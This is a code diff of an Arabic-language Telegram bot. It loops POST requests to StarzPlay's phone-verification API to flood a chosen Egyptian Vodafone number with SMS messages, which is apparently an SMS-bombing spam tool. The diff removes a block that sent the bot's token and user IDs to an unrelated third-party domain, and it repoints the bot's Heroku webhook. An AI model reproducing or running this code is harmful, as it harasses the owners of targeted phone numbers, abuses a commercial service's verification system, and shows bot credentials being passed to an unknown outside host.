@@ -12,24 +12,6 @@ logger = telebot.logger
 logger.setLevel(logging.DEBUG)
 @bot.message_handler(commands=["start"])
 def f(message):
-	id = message.from_user.id
-	name = message.chat.first_name
-	t = "bo0tt"
-	api = requests.get(f"https://ggrff7hnn.ml/vip1/Api(all)carlos.php?token={tok}&chaneel={t}&user_id={id}")
-	if '"result":false' in api.text:
-		p = types.InlineKeyboardButton(text="-قناه الاشتراك",url=f"https://t.me/{t}")
-		maac = types.InlineKeyboardMarkup()
-		maac.row_width = 4
-		maac.add(p)
-		bot.send_message(message.chat.id,text=f"""
-🚸| عذرا عزيزي
-🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه
-
-- @{t}
-
-‼️| اشترك ثم ارسل /start
-""",parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
-	if '"result":true' in api.text:
 		id = message.from_user.id
 		name = message.chat.first_name
 		u = "https://t.me/pydroi_d_3/37"
@@ -52,7 +34,7 @@ def f(message):
 	chat_id = str(message.chat.id)
 	start = bot.send_message(message.chat.id, f'Whit...')
 	for i in range(er):
-		url = 'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'
+		urll = 'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'
 		headers = {
 	"Host": "arabia.starzplay.com",
     "content-length": "86",
@@ -76,7 +58,7 @@ def f(message):
     'mobileNumber' :number,
     'operator' : 'vodafoneegypt' 
 	}
-		re = requests.post(url,headers=headers,data=data).text
+		re = requests.post(urll,headers=headers,data=data).text
 		if ("smsTransactionId") in re:
 			g+=1
 			result = f"""
@@ -108,5 +90,5 @@ def redirect_message():
 
 if __name__ == "__main__":
     bot.remove_webhook()
-    bot.set_webhook(url="https://telebotspam.herokuapp.com/"+str(BOT_TOKEN))
+    bot.set_webhook(url="https://bot7amody.herokuapp.com/"+str(BOT_TOKEN))
     server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
